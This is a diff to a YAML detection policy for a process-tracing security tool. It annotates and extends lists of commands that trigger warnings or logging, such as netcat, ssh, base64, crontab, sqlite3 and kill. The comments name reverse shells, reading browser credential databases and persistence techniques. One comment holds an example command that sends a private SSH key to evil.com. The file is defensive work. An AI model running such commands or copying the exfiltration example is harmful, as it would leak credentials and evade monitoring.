@@ -40,30 +40,53 @@ nodejs:
 # Executed commands
 commands:
   warn:
+    # Privilege escalation — can run commands as root, bypass all file/network restrictions
     - sudo
     - su
     - doas
-    - ssh
-    - scp
-    - sftp
-    - nc
-    - ncat
-    - socat
-    - telnet
-    - base64
-    - xxd
-    - crontab
-    - launchctl
-    - systemctl
+    # Remote access — can open interactive sessions or transfer files to external hosts
+    - ssh            # interactive shell on remote host
+    - scp            # copy files to/from remote host over SSH
+    - sftp           # interactive file transfer over SSH
+    # Raw networking — can open arbitrary TCP/UDP connections, bypassing HTTP-level hooks
+    - nc             # netcat: raw TCP/UDP connections, reverse shells
+    - ncat           # nmap's netcat: same as nc with SSL support
+    - socat          # bidirectional data relay between two channels
+    - telnet         # unencrypted remote connections
+    # Encoding tools — can obfuscate exfiltrated data to evade content inspection
+    - base64         # base64 encode/decode: hides data in transit
+    - xxd            # hex dump/undump: binary data obfuscation
+    # Persistence mechanisms — can schedule code to run after tracing ends
+    - crontab        # schedule recurring tasks (Linux/macOS)
+    - launchctl      # manage macOS LaunchAgents/LaunchDaemons
+    - systemctl      # manage systemd services (Linux)
+    # Scripting interpreters — can execute arbitrary code, bypassing traced process
+    - osascript    # AppleScript/JXA: shell access, file I/O, network via scripting bridge
+    - swift        # Swift interpreter: full system access
+    - java         # JVM: arbitrary code execution, network I/O
+    # Data exfiltration — can leak sensitive data without network hooks seeing it
+    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat ~/.ssh/id_rsa)"
+    - sqlite3      # queries browser credential DBs (Chrome Login Data, Safari, etc.)
+    # Credential/config readers — read secrets from macOS system stores
+    - plutil       # reads plist files: app tokens, Safari data, stored credentials
+    - defaults     # reads macOS preferences: OAuth tokens, login items, app secrets
+    # Anti-tracing — can terminate the malwi agent or CLI process
+    - kill
+    - pkill
+    - killall
   log:
+    # HTTP clients — can download or exfiltrate data; logged for visibility
     - curl
     - wget
+    # Package managers — can install arbitrary code from remote registries
     - git
     - npm
     - pip
     - gem
     - cargo
+    # Container runtime — can spawn isolated environments, mount host filesystems
     - docker
+    # Network scanner — can probe internal/external hosts for open ports
     - nmap
 
 # Warn on cloud metadata endpoints (SSRF indicators)
